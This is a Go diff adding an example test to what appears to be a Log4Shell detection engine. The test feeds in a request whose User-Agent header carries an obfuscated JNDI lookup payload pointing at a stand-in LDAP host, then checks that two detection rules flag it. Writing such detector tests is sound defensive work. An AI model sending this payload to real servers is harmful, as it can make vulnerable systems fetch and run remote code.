@@ -42,3 +42,23 @@ func ExampleResolve_afterDecoding() {
 	// Output:
 	// found after [percent] -> jndi ldap://x.invalid/a
 }
+
+func ExampleInspect() {
+	req := engine.Request{
+		Method: "GET",
+		Target: "/search?q=shoes",
+		Headers: []engine.Header{
+			{Name: "Host", Value: "shop.example.com"},
+			{Name: "User-Agent", Value: "${${lower:j}ndi:ldap://x.invalid/a}"},
+		},
+	}
+	v := engine.Inspect(req, engine.Config{})
+	fmt.Println(v.Decision, v.RuleIDs())
+	for _, d := range v.Detections {
+		fmt.Println(d.Rule, d.Location, d.Evidence)
+	}
+	// Output:
+	// malicious [LSH-1002 LSH-2002]
+	// LSH-1002 header-value:User-Agent ldap://x.invalid/a
+	// LSH-2002 header-value:User-Agent lower
+}
